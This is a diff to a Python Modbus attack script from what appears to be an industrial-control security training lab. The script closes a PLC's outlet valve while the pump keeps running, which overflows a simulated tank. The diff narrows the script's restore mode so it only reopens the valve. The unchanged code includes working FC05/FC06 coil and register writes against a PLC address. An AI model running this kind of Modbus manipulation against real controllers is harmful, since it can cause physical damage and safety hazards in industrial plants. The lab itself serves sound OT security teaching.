@@ -280,9 +280,12 @@ Default action  (no flags):  ATTACK  — close outlet valve, keep pump running.
                               500 ms via FC06 Write Single Register so the overflow
                               is immediately visible in the OT canvas animation.
 
-With --restore:              RESTORE — stop pump, open outlet valve.
-                              A timed loop then decrements HR 1024 by 5 cm every
-                              500 ms until the tank is empty, reversing the damage.
+With --restore:              RESTORE — reopen the outlet valve only (Coil 1 → TRUE).
+                              The pump coil is NOT touched; it was not part of the
+                              attack and the restore undoes only what was changed.
+                              With valve open and pump running, inlet = outlet = 120
+                              L/min so the level stabilises at its current value.
+                              Run plc_init.py separately to reset level to 500 cm.
 
 Both modes keep the Modbus connection open for the duration of the loop.
 Press Ctrl+C at any time to stop the loop (coil states remain on the PLC).
@@ -319,9 +322,8 @@ PLC_IP   = os.environ.get('PLC_IP',   '10.200.10.10')
 PLC_PORT = int(os.environ.get('PLC_PORT', '502'))
 
 if RESTORE_MODE:
-    PUMP_STATE  = False
     VALVE_STATE = True
-    mode_label  = "RESTORE — stop pump, open outlet valve (tank drains)"
+    mode_label  = "RESTORE — reopen outlet valve only (pump not touched)"
 else:
     PUMP_STATE  = True
     VALVE_STATE = False
@@ -329,7 +331,8 @@ else:
 
 print(f"[*] Mode:      {mode_label}")
 print(f"[*] Target:    {PLC_IP}:{PLC_PORT}")
-print(f"[*] Coil 0 → {'TRUE  (pump ON)'    if PUMP_STATE  else 'FALSE (pump OFF)'}")
+if not RESTORE_MODE:
+    print(f"[*] Coil 0 → {'TRUE  (pump ON)'    if PUMP_STATE  else 'FALSE (pump OFF)'}")
 print(f"[*] Coil 1 → {'TRUE  (valve OPEN)' if VALVE_STATE else 'FALSE (valve CLOSED)'}")
 print()
 print(f"[*] Connecting to PLC ...")
@@ -348,16 +351,19 @@ if not connected:
 
 print(f"[+] Connected — sending Modbus FC05 (Write Single Coil) frames ...\n")
 
-# ── Write Coil 0 — inlet pump ─────────────────────────────────────────────────
-try:
-    r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
-    if hasattr(r0, 'isError') and r0.isError():
-        print(f"[error] write_coil(0) returned error: {r0}")
+# ── Write Coil 0 — inlet pump (attack mode only) ──────────────────────────────
+# Restore mode deliberately does NOT write Coil 0.  The attack only closed the
+# outlet valve; the pump was not changed, so the restore undoes only that change.
+if not RESTORE_MODE:
+    try:
+        r0 = client.write_coil(address=0, value=PUMP_STATE, device_id=1)
+        if hasattr(r0, 'isError') and r0.isError():
+            print(f"[error] write_coil(0) returned error: {r0}")
+            client.close(); sys.exit(1)
+    except (ModbusException, Exception) as e:
+        print(f"[error] write_coil(0) raised exception: {e}")
         client.close(); sys.exit(1)
-except (ModbusException, Exception) as e:
-    print(f"[error] write_coil(0) raised exception: {e}")
-    client.close(); sys.exit(1)
-print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 ACK'd")
+    print(f"[+] Coil 0 (inlet pump)    → {'TRUE  (ON)'   if PUMP_STATE  else 'FALSE (OFF)'}   — FC05 ACK'd")
 
 # ── Write Coil 1 — outlet valve ───────────────────────────────────────────────
 try:
@@ -435,34 +441,28 @@ if not RESTORE_MODE:
 
 else:
     # ── RESTORE mode ──────────────────────────────────────────────────────────
-    print("[+] PLC set to safe drain state.")
-    print("    Coil 0 = FALSE (pump OFF) | Coil 1 = TRUE (valve OPEN)")
+    # Only Coil 1 (valve_open) was written above — Coil 0 (pump_run) is left
+    # exactly as the PLC had it before the attack.  With valve OPEN and pump
+    # still ON, inlet flow = outlet flow = 120 L/min → level stabilises.
+    print("[+] Valve restored — outlet open.")
+    print("    Coil 1 = TRUE (valve OPEN)  |  Coil 0 unchanged (pump still running)")
     print()
-
-    # Timed drain loop — reads HR 1024 (%MW0 = tank_level), subtracts 5 cm, writes back every 500 ms.
-    print("[*] Decrementing tank level 5 cm every 500 ms via FC06 Write Register.")
-    print("[*] Watch the Water Tank icon in the OT canvas. Press Ctrl+C to stop.\n")
+    # Read current level so the student can see the stabilised state
     try:
-        while True:
-            try:
-                reg = client.read_holding_registers(address=1024, count=1, device_id=1)
-                if not (hasattr(reg, 'isError') and reg.isError()):
-                    lvl     = min(reg.registers[0], 1000)
-                    new_lvl = max(lvl - 5, 0)
-                    client.write_register(address=1024, value=new_lvl, device_id=1)
-                    print(f"\r{_bar(new_lvl)}", end='', flush=True)
-                    if new_lvl <= 0:
-                        print()
-                        print()
-                        print("[+] Tank empty — drain complete.")
-                        print("[+] Pump is OFF. To return to balanced operation run  plc_init.py")
-                        break
-            except (ModbusException, Exception):
-                pass
-            time.sleep(0.5)
-    except KeyboardInterrupt:
-        print()
-        print("[*] Monitoring stopped.")
+        reg = client.read_holding_registers(address=1024, count=3, device_id=1)
+        if not (hasattr(reg, 'isError') and reg.isError()):
+            lvl    = reg.registers[0]
+            q_in   = reg.registers[1]
+            q_out  = reg.registers[2]
+            print(f"[*] Current state:  tank_level={lvl} cm  inlet_flow={q_in} L/min  outlet_flow={q_out} L/min")
+            print(f"[*] {_bar(lvl)}")
+    except Exception:
+        pass
+    print()
+    print("[*] The process is no longer in a fault condition.")
+    print("[*] Inlet and outlet flows are balanced — level will not rise further.")
+    print("[*] To reset the tank to 500 cm (50% baseline), run:")
+    print("[*]   python3 /root/Desktop/Attack_Scripts/plc_init.py")
 
 client.close()
 PYEOF
